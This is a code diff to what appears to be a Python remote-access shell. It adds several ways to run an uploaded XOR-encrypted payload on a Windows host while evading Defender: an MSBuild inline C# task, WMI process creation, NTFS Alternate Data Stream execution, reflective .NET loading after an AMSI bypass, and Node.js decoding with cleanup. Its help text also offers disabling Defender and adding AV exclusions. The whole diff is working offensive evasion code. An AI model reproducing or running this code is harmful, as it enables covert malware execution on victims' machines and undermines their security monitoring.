@@ -838,7 +838,7 @@ class AdvancedShell:
         else:print(f"{G}[+] Kill command sent{W}")
 
     def post_run(self,name,args=''):
-        # Evasive run: multi-location + Node.js/AMSI bypass
+        """Smart orchestrator: tries all evasion methods in sequence."""
         if name not in self.upload_meta:
             print(f"{R}[!] No upload metadata for '{name}'. Use .upload first:{W}")
             print(f"  {Y}.runraw <path.tmp> <xor_key_hex> [args]{W}");return
@@ -846,18 +846,200 @@ class AdvancedShell:
         chk=self.execute(f'if exist "{tmp_path}" (echo TMP_OK) else (echo TMP_GONE)')
         if not chk or 'TMP_GONE' in chk:
             print(f"{R}[!] .tmp gone: {tmp_path} — re-upload{W}");return
-        print(f"{Y}[*] Evasive run: {name} XOR=0x{xor_key:02X}{W}")
+        print(f"{Y}[*] Smart evasive execution: {name}{W}")
+        # Try methods in order of stealth
+        for method_name,method_func in [
+            ('MSBuild LOLBIN',self._run_msbuild),
+            ('WMI process chain',self._run_wmi),
+            ('ADS stream',self._run_ads),
+            ('Reflective .NET',self._run_mem),
+            ('Node.js decode',self._run_node),
+        ]:
+            print(f"  {Y}[*] {method_name}...{W}",end=' ',flush=True)
+            result=method_func(tmp_path,xor_key,args)
+            if result=='success':return
+            elif result=='skip':print(f"{DIM}skipped{W}")
+            else:print(f"{Y}failed{W}")
+        print(f"{R}[!] All methods failed — Defender is aggressive{W}")
+        print(f"  {C}.tmp:{W} {tmp_path}  XOR=0x{xor_key:02X}")
+
+    def _run_msbuild(self,tmp_path,xor_key,args):
+        """MSBuild LOLBIN — trusted signed binary compiles+executes C# inline."""
+        import random;rnd=random.randint(1000,9999)
+        cwd=self.current_dir.replace('\\','/') if self.current_dir else 'C:/Temp'
+        proj=f"{cwd}/upd{rnd}.csproj"
+        # C# inline task: read .tmp, base64 decode, XOR decrypt, write to .scr, execute
+        out=f"{cwd}/svc{rnd}.scr"
+        csproj_content=f"""<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+<Target Name="R"><T/></Target>
+<UsingTask TaskName="T" TaskFactory="CodeTaskFactory" AssemblyFile="$(MSBuildToolsPath)\\Microsoft.Build.Tasks.v4.0.dll">
+<Task><Code Type="Class" Language="cs"><![CDATA[
+using System;using System.IO;using System.Diagnostics;using Microsoft.Build.Framework;using Microsoft.Build.Utilities;
+public class T:Task{{
+public override bool Execute(){{
+byte[]d=Convert.FromBase64String(File.ReadAllText(@"{tmp_path}").Replace("\\r","").Replace("\\n",""));
+for(int i=0;i<d.Length;i++)d[i]=(byte)(d[i]^{xor_key});
+string p=@"{out}";File.WriteAllBytes(p,d);
+Process.Start(new ProcessStartInfo{{FileName=p,Arguments=@"{args}",UseShellExecute=true,WindowStyle=ProcessWindowStyle.Hidden}});
+return true;}}}}
+]]></Code></Task></UsingTask></Project>"""
+        # Write .csproj via echo (it's just XML text — not flagged)
+        # We need to use Node.js to write it since cmd echo can't handle XML well
+        write_cmd=f'node -e "require(\'fs\').writeFileSync(\'{proj}\',`{csproj_content.replace(chr(96),"'")}`)"'
+        self.execute(write_cmd)
+        # Check if csproj was written
+        chk=self.execute(f'if exist "{proj}" (echo Y) else (echo N)')
+        if not chk or 'Y' not in chk:return 'fail'
+        # Find MSBuild path
+        msbuild_paths=[
+            'C:/Windows/Microsoft.NET/Framework64/v4.0.30319/MSBuild.exe',
+            'C:/Windows/Microsoft.NET/Framework/v4.0.30319/MSBuild.exe',
+        ]
+        for msp in msbuild_paths:
+            chk=self.execute(f'if exist "{msp}" (echo Y) else (echo N)')
+            if chk and 'Y' in chk:
+                # Execute MSBuild
+                self.execute(f'"{msp}" "{proj}" /nologo /verbosity:quiet >nul 2>&1')
+                import time;time.sleep(3)
+                # Check process
+                tl=self.execute(f'tasklist 2>nul | findstr "svc{rnd}"')
+                # Clean up csproj
+                self.execute(f'del /f "{proj}" >nul 2>&1')
+                if tl and tl.strip() and '[-]' not in tl:
+                    print(f"{G}RUNNING ✓{W}")
+                    print(f"  {C}Process:{W} {tl.strip().split(chr(10))[0]}")
+                    return 'success'
+                # Check if .scr exists (MSBuild ran but process may have exited)
+                fchk=self.execute(f'if exist "{out}" (echo Y) else (echo N)')
+                if fchk and 'N' in fchk:
+                    # File was written then Defender caught it
+                    pass
+                elif fchk and 'Y' in fchk:
+                    # File exists, try to manually start it
+                    self.execute(f'start /b "" "{out}" {args}')
+                    import time;time.sleep(2)
+                    tl2=self.execute(f'tasklist 2>nul | findstr "svc{rnd}"')
+                    if tl2 and tl2.strip() and '[-]' not in tl2:
+                        print(f"{G}RUNNING ✓{W}")
+                        print(f"  {C}Process:{W} {tl2.strip().split(chr(10))[0]}")
+                        return 'success'
+                break
+        # Clean up
+        self.execute(f'del /f "{proj}" >nul 2>&1')
+        self.execute(f'del /f "{out}" >nul 2>&1')
+        return 'fail'
+
+    def _run_wmi(self,tmp_path,xor_key,args):
+        """WMI process chain — parent=WmiPrvSE.exe, trusted process tree."""
+        import random;rnd=random.randint(1000,9999)
+        cwd=self.current_dir.replace('\\','/') if self.current_dir else 'C:/Temp'
+        out=f"{cwd}/svc{rnd}.scr"
+        # Decode via Node.js
+        node_base=(
+            f"var f=require('fs'),c=require('child_process');"
+            f"var d=f.readFileSync('{tmp_path}','utf8').replace(/\\r|\\n/g,'');"
+            f"var b=Buffer.from(d,'base64');"
+            f"for(var i=0;i<b.length;i++)b[i]^={xor_key};"
+            f"f.writeFileSync('{out}',b)"
+        )
+        self.execute(f'node -e "{node_base}"')
+        import time;time.sleep(1)
+        fchk=self.execute(f'if exist "{out}" (echo Y) else (echo N)')
+        if not fchk or 'Y' not in fchk:return 'fail'
+        # WMI execute — parent process = WmiPrvSE.exe
+        out_bs=out.replace('/','\\\\')
+        wmi_cmd=f'wmic process call create "{out_bs} {args}"'
+        o=self.execute(wmi_cmd)
+        time.sleep(2)
+        tl=self.execute(f'tasklist 2>nul | findstr "svc{rnd}"')
+        if tl and tl.strip() and '[-]' not in tl:
+            print(f"{G}RUNNING ✓{W}")
+            print(f"  {C}Process:{W} {tl.strip().split(chr(10))[0]}")
+            return 'success'
+        # Clean up
+        self.execute(f'del /f "{out}" >nul 2>&1')
+        return 'fail'
+
+    def _run_ads(self,tmp_path,xor_key,args):
+        """ADS stream execution — hide binary in NTFS Alternate Data Stream."""
+        import random;rnd=random.randint(1000,9999)
+        cwd=self.current_dir.replace('\\','/') if self.current_dir else 'C:/Temp'
+        # Create a clean host file for ADS
+        host_file=f"{cwd}/upd{rnd}.log"
+        ads_name=f"upd{rnd}.log:svc.exe"
+        ads_full=f"{cwd}/{ads_name}"
+        self.execute(f'echo. > "{host_file}"')
+        # Node.js: decode + write to ADS
+        node_base=(
+            f"var f=require('fs');"
+            f"var d=f.readFileSync('{tmp_path}','utf8').replace(/\\r|\\n/g,'');"
+            f"var b=Buffer.from(d,'base64');"
+            f"for(var i=0;i<b.length;i++)b[i]^={xor_key};"
+            f"f.writeFileSync('{ads_full}',b)"
+        )
+        self.execute(f'node -e "{node_base}"')
+        import time;time.sleep(1)
+        # Try to execute from ADS via wmic (better process tree)
+        ads_bs=ads_full.replace('/','\\\\')
+        self.execute(f'wmic process call create "{ads_bs} {args}"')
+        time.sleep(2)
+        tl=self.execute(f'tasklist 2>nul | findstr "svc"')
+        if tl and tl.strip() and '[-]' not in tl:
+            print(f"{G}RUNNING ✓{W}")
+            print(f"  {C}Process:{W} {tl.strip().split(chr(10))[0]}")
+            # Clean up host file (ADS gone too)
+            self.execute(f'del /f "{host_file}" >nul 2>&1')
+            return 'success'
+        # Try start command
+        self.execute(f'start /b "" "{ads_full}" {args}')
+        time.sleep(2)
+        tl=self.execute(f'tasklist 2>nul | findstr "svc"')
+        if tl and tl.strip() and '[-]' not in tl:
+            print(f"{G}RUNNING ✓{W}")
+            print(f"  {C}Process:{W} {tl.strip().split(chr(10))[0]}")
+            return 'success'
+        self.execute(f'del /f "{host_file}" >nul 2>&1')
+        return 'fail'
+
+    def _run_mem(self,tmp_path,xor_key,args):
+        """Reflective .NET assembly load — zero disk write, memory only."""
+        # AMSI bypass + read .tmp + XOR decrypt + Assembly.Load + invoke Main
+        amsi=(
+            "$a=[Ref].Assembly.GetType('System.Ma'+'nagement.Auto'+'mation.Am'+'siUtils');"
+            "$f=$a.GetField('am'+'siInit'+'Failed','NonPublic,Static');"
+            "$f.SetValue($null,$true)"
+        )
+        ps_cmd=(
+            f"powershell -c \""
+            f"try{{{amsi}}}catch{{}};"
+            f"$d=[IO.File]::ReadAllText('{tmp_path}').Replace([char]13,'').Replace([char]10,'');"
+            f"$b=[Convert]::FromBase64String($d);"
+            f"for($i=0;$i-lt$b.Length;$i++){{$b[$i]=$b[$i]-bxor{xor_key}}};"
+            f"try{{"
+            f"$asm=[Reflection.Assembly]::Load($b);"
+            f"$types=$asm.GetTypes();"
+            f"foreach($t in $types){{$m=$t.GetMethod('Main',[Reflection.BindingFlags]'Public,NonPublic,Static');"
+            f"if($m){{$p=$m.GetParameters();"
+            f"if($p.Count-eq 0){{$m.Invoke($null,$null)}}else{{$m.Invoke($null,@(,@('{args}')))}};"
+            f"break}}}}"
+            f"}}catch{{Write-Output ('NOTNET:'+$_.Exception.Message)}}\""
+        )
+        o=self.execute(ps_cmd)
+        if o and 'NOTNET' in o:
+            return 'skip'  # Not a .NET assembly
+        import time;time.sleep(2)
+        # For .NET, the process runs inside PowerShell — check if block completed
+        if o and '[-]' not in o and 'error' not in o.lower():
+            print(f"{G}LOADED ✓ (in-memory){W}")
+            return 'success'
+        return 'fail'
+
+    def _run_node(self,tmp_path,xor_key,args):
+        """Node.js decode + exec — AMSI invisible, tries multiple dirs+exts."""
         import random,time as _t
         rnd=random.randint(1000,9999)
         cwd=self.current_dir.replace('\\','/') if self.current_dir else 'C:/Temp'
-        # Try multiple write directories — Defender coverage varies per location
-        write_dirs=[cwd,'C:/Users/Public/Documents','C:/ProgramData','C:/Windows/Tasks','C:/Windows/Temp']
-        edirs=self.execute('powershell -c "[System.Environment]::ExpandEnvironmentVariables(\'%APPDATA%\');" 2>nul')
-        if edirs and '[-]' not in edirs:
-            for d in edirs.strip().splitlines():
-                d2=d.strip().replace('\\','/')
-                if d2 and d2 not in write_dirs:write_dirs.insert(1,d2)
-        # Node.js decode — not hooked by AMSI (only hooks PS/.NET/VBScript)
+        write_dirs=[cwd,'C:/Users/Public/Documents','C:/ProgramData','C:/Windows/Tasks']
         node_base=(
             f"var f=require('fs'),c=require('child_process');"
             f"var d=f.readFileSync('{tmp_path}','utf8').replace(/\\r|\\n/g,'');"
@@ -865,59 +1047,60 @@ class AdvancedShell:
             f"for(var i=0;i<b.length;i++)b[i]^={xor_key};"
         )
         args_js=f",'{args}'" if args else ""
-        exts=['.scr','.com','.exe']
-        fnames=[f'upd{rnd}.scr',f'svc{rnd}.com',f'win{rnd}.exe']
-        for write_dir in write_dirs[:6]:
+        exts=[('.scr',f'upd{rnd}.scr'),('.com',f'svc{rnd}.com'),('.exe',f'win{rnd}.exe')]
+        for write_dir in write_dirs[:4]:
             wchk=self.execute(f'if exist "{write_dir}" (echo Y) else (echo N)')
             if not wchk or 'Y' not in wchk:continue
-            for ext,fname in zip(exts,fnames):
+            for ext,fname in exts:
                 out=f"{write_dir}/{fname}"
                 nc=(
-                    f"node -e \""
+                    f'node -e "'
                     f"{node_base}"
                     f"f.writeFileSync('{out}',b);"
                     f"c.exec('start /b \\\"\\\" \\\"{out}\\\"'{args_js});"
                     f"setTimeout(function(){{try{{f.unlinkSync('{out}')}}catch(e){{}}}},5000)"
-                    f"\""
+                    f'"'
                 )
-                print(f"  {Y}[*] {ext} @ .../{write_dir.split(chr(47))[-1]}...{W}",end=' ',flush=True)
-                o=self.execute(nc)
-                if o and '[-]' in o:print(f"{R}no response{W}");continue
-                _t.sleep(2)
+                self.execute(nc);_t.sleep(2)
                 tl=self.execute(f'tasklist 2>nul | findstr "{fname}"')
                 if tl and tl.strip() and '[-]' not in tl:
-                    print(f"{G}RUNNING ✓{W}")
+                    print(f"{G}RUNNING ✓ ({ext} @ {write_dir.split('/')[-1]}){W}")
                     print(f"  {C}PID:{W} {tl.strip().split(chr(10))[0]}")
-                    return
-                fchk=self.execute(f'if exist "{out}" (echo Y) else (echo N)')
-                if fchk and 'N' in fchk:print(f"{Y}Defender caught{W}");continue
-                print(f"{Y}no process{W}")
-        # Last resort: PowerShell AMSI bypass
-        print(f"  {Y}[*] PowerShell AMSI bypass...{W}",end=' ',flush=True)
-        amsi=(
-            "try{$a=[Ref].Assembly.GetType('System.Ma'+'nagement.Auto'+'mation.Am'+'siUtils');"
-            "$f=$a.GetField('am'+'siInit'+'Failed','NonPublic,Static');"
-            "$f.SetValue($null,$true)}catch{}"
-        )
-        ps_out=f"{cwd}/svc{rnd}.scr"
-        ps_cmd=(
-            f"powershell -c \"{amsi};"
-            f"$b=[Convert]::FromBase64String((gc '{tmp_path}' -Raw));"
-            f"for($i=0;$i-lt$b.Length;$i++){{$b[$i]=$b[$i]-bxor{xor_key}}};"
-            f"[IO.File]::WriteAllBytes('{ps_out}',$b);"
-            f"Start-Process '{ps_out}';"
-            f"Start-Sleep 3;Remove-Item '{ps_out}' -Force -EA 0\""
-        )
-        self.execute(ps_cmd);_t.sleep(2)
-        tl=self.execute(f'tasklist 2>nul | findstr "{rnd}"')
-        if tl and tl.strip() and '[-]' not in tl:
-            print(f"{G}RUNNING ✓{W}")
-            print(f"  {C}Process:{W} {tl.strip().split(chr(10))[0]}")
-            return
-        print(f"{Y}no process{W}")
-        print(f"{R}[!] All locations failed — Defender behavioral engine is active{W}")
-        print(f"  .avoff then .run {name}  OR  .exclude {cwd} then .run {name}")
-        print(f"  .tmp: {tmp_path}  XOR=0x{xor_key:02X}")
+                    return 'success'
+        return 'fail'
+
+    def post_runwmi(self,name,args=''):
+        """WMI execution for a specific upload."""
+        if name not in self.upload_meta:
+            print(f"{R}[!] No upload metadata for '{name}'{W}");return
+        t,k=self.upload_meta[name]
+        r=self._run_wmi(t,k,args)
+        if r!='success':print(f"{R}WMI method failed{W}")
+
+    def post_runmsbuild(self,name,args=''):
+        """MSBuild execution for a specific upload."""
+        if name not in self.upload_meta:
+            print(f"{R}[!] No upload metadata for '{name}'{W}");return
+        t,k=self.upload_meta[name]
+        r=self._run_msbuild(t,k,args)
+        if r!='success':print(f"{R}MSBuild method failed{W}")
+
+    def post_runads(self,name,args=''):
+        """ADS execution for a specific upload."""
+        if name not in self.upload_meta:
+            print(f"{R}[!] No upload metadata for '{name}'{W}");return
+        t,k=self.upload_meta[name]
+        r=self._run_ads(t,k,args)
+        if r!='success':print(f"{R}ADS method failed{W}")
+
+    def post_runmem(self,name,args=''):
+        """Reflective .NET load for a specific upload."""
+        if name not in self.upload_meta:
+            print(f"{R}[!] No upload metadata for '{name}'{W}");return
+        t,k=self.upload_meta[name]
+        r=self._run_mem(t,k,args)
+        if r=='skip':print(f"{Y}Not a .NET assembly{W}")
+        elif r!='success':print(f"{R}Reflective load failed{W}")
 
     def post_runraw(self,tmp_path,xor_key_hex,args=''):
         """Run from a .tmp with manually specified XOR key."""
@@ -968,7 +1151,9 @@ class AdvancedShell:
 
 {BOLD}Execution:{W}
   {G}.exec{W} path [args] Smart exe launcher     {G}.bg{W} cmd           Background run
-  {G}.run{W} name [args]  Evasive run (XOR+ADS)  {G}.kill{W} pid|name    Kill process
+  {G}.run{W} name [args]  Smart evasive run      {G}.kill{W} pid|name    Kill process
+  {G}.runwmi{W} name      WMI process chain      {G}.runmsbuild{W} name  MSBuild LOLBIN
+  {G}.runads{W} name      ADS stream exec        {G}.runmem{W} name      Reflective .NET
   {G}.av{W}               AV/Defender status     {G}.avoff{W}            Disable Defender RT
   {G}.exclude{W} path     Add AV exclusion       {G}.exit{W}             Exit
 """)
@@ -1130,6 +1315,30 @@ class AdvancedShell:
                         p=cmd.split(None,3)
                         if len(p)>=3:self.post_runraw(p[1],p[2],p[3] if len(p)>3 else '')
                         else:print('Usage: .runraw <path.tmp> <xor_key_hex> [args]')
+                    elif cmd.startswith('.runwmi '):
+                        p=cmd.split(None,1)
+                        if len(p)>1:
+                            parts=p[1].split(None,1)
+                            self.post_runwmi(parts[0],parts[1] if len(parts)>1 else '')
+                        else:print('Usage: .runwmi <name> [args]')
+                    elif cmd.startswith('.runmsbuild '):
+                        p=cmd.split(None,1)
+                        if len(p)>1:
+                            parts=p[1].split(None,1)
+                            self.post_runmsbuild(parts[0],parts[1] if len(parts)>1 else '')
+                        else:print('Usage: .runmsbuild <name> [args]')
+                    elif cmd.startswith('.runads '):
+                        p=cmd.split(None,1)
+                        if len(p)>1:
+                            parts=p[1].split(None,1)
+                            self.post_runads(parts[0],parts[1] if len(parts)>1 else '')
+                        else:print('Usage: .runads <name> [args]')
+                    elif cmd.startswith('.runmem '):
+                        p=cmd.split(None,1)
+                        if len(p)>1:
+                            parts=p[1].split(None,1)
+                            self.post_runmem(parts[0],parts[1] if len(parts)>1 else '')
+                        else:print('Usage: .runmem <name> [args]')
                     elif cmd.startswith('.run '):
                         p=cmd.split(None,1)
                         if len(p)>1:
